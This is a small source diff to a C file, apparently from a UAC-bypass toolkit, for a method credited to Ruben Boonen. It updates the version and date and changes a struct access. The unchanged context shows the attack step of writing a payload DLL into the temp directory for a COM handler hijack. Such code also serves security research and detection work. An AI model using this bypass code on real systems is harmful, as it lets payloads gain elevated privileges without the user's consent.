@@ -4,9 +4,9 @@
 *
 *  TITLE:       B33F.C
 *
-*  VERSION:     3.00
+*  VERSION:     3.11
 *
-*  DATE:        27 Aug 2018
+*  DATE:        23 Nov 2018
 *
 *  UAC bypass method from Ruben Boonen aka b33f.
 *
@@ -45,7 +45,7 @@ BOOL ucmCOMHandlersMethod(
         //
         // Drop payload dll to the %temp%
         //
-        _strcpy(szBuffer, g_ctx.szTempDirectory);
+        _strcpy(szBuffer, g_ctx->szTempDirectory);
         _strcat(szBuffer, MYSTERIOUSCUTETHING);
         _strcat(szBuffer, TEXT(".dll"));
         if (!supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize))
